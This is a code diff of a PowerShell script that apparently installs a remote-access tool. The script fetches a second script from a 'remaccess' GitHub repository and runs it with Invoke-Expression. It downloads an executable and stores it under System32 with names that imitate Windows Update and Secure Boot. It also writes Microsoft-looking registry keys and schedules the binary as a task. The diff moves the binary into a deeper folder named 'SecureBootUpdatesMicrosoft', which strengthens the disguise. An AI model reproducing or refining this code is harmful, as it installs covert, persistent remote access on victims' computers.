@@ -1,8 +1,8 @@
-$localFilePath = "C:\Windows\System32\WindowsUpdateServiceDaemon.exe"
+$localFilePath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe"
 $urlforping = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/WindowsDiscordPingStatus.exe"
 $urlfortc = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1"
 $pingpreampdaemon = "Windows Update Service Daemon"
-$regPath = "HKLM:\Software\WindowsUpdateService"
+$regPath = "HKLM:\SOFTWARE\Microsoft\WindowsUpdateService"
 $regpreampd = "HKLM:\SOFTWARE\Microsoft\MicrosoftUpdateServiceDaemon"
 Invoke-Expression (Invoke-WebRequest -Uri $urlfortc -UseBasicParsing).Content
 if (Test-Path -Path $localFilePath -PathType Leaf) {
@@ -65,7 +65,7 @@ $pingpreampdaemonxml = @"
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>C:\Windows\System32\WindowsUpdateServiceDaemon.exe</Command>
+      <Command>C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe</Command>
     </Exec>
   </Actions>
 </Task>
